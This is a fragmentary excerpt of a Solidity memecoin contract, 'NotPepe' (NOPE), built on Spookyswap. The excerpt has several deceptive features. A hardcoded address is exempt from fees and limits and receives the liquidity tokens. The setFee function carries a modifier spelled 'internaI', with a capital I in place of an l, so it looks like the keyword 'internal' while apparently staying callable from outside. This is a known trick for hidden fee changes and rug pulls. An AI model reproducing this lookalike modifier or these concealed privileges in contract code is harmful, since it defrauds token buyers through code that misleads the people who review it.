/**
 *Submitted for verification at FtmScan.com on 2023-04-29
*/
...
contract NotPepeToken is ERC20, Ownable {
    using SafeMath for uint256;
    address routerAdress = 0xF491e7B69E4244ad4002BC14e878a34207E38c29;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    string constant _name = "NotPepe";
    string constant _symbol = "NOPE";
    uint256 public _totalSupply = uint256(69_000_000_000_000 * (10 ** 9));
    ...
    uint256 devFee = 0;
    uint256 totalFee = liquidityFee + devFee;
    uint256 feeDenominator = 100;

    address public devFeeReceiver = 0xFea29D8Ce0c28c7400E4F703b4251F2Af99a0Bb5;

    SpookyswapRouter public router;
    address public pair;
    ...
    constructor () Ownable(msg.sender) {
        router = SpookyswapRouter(routerAdress);
        pair = SpookyswapFactory(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;

        address _owner = owner;
        isFeeExempt[0xFea29D8Ce0c28c7400E4F703b4251F2Af99a0Bb5] = true; 
        isTxLimitExempt[_owner] = true;
        isTxLimitExempt[0xFea29D8Ce0c28c7400E4F703b4251F2Af99a0Bb5] = true;
    ...
    function swapBack() internal swapping {
        ...
        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountETHLiquidity}(
                ...
                0,
                0,
                0xFea29D8Ce0c28c7400E4F703b4251F2Af99a0Bb5,
                block.timestamp
            );
    ...
    function setFee(uint256 _liquidityFee, uint256 _devFee) external internaI {
